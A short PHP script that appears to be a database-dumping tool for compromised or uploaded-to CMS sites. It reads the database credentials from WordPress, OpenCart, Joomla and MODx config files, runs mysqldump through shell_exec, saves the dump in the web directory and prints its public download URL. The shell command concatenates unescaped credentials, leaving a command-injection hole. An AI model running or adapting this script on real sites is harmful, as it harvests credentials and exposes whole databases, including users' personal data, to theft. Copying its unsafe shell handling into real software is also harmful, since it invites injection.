<?php
set_time_limit (0);

//WORDPRESS
if (file_exists('wp-config.php')) {
    include('wp-config.php');
    MakeDump (DB_HOST,DB_NAME,DB_USER,DB_PASSWORD,"Wordress");
}
//OPENCART
if (file_exists('config.php')) {
    include('config.php');
    MakeDump (DB_HOSTNAME,DB_DATABASE,DB_USERNAME,DB_PASSWORD, "Opencart");

}

//Joomla
if (file_exists('configuration.php')) {
    include('configuration.php');
    $config=new JConfig;
    MakeDump ($config->host,$config->db,$config->user,$config->password,"Joomla");

}

//MODx Revolution:
if (file_exists('core/config/config.inc.php')) {
    include('core/config/config.inc.php');
    MakeDump ($database_server,$dbase,$database_user,$database_password,"MODx Revolution");
}


function MakeDump($dbhost,$dbname,$dbuser,$dbpassword,$engine)
{
    echo "Engine recognized as -> $engine<br>";
    shell_exec('mysqldump -u'.$dbuser.' -h'.$dbhost.' -p'.$dbpassword.' '.$dbname.' > '.$dbname.'.sql');
    echo "Dump done, ";

    if (isset($_SERVER['REQUEST_URI'])) {
    $current_url = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
    echo "Database file -> ".dirname($current_url)."/".$dbname.".sql";

    } else {
        echo "Database file -> $dbname.sql";
    }
    
}
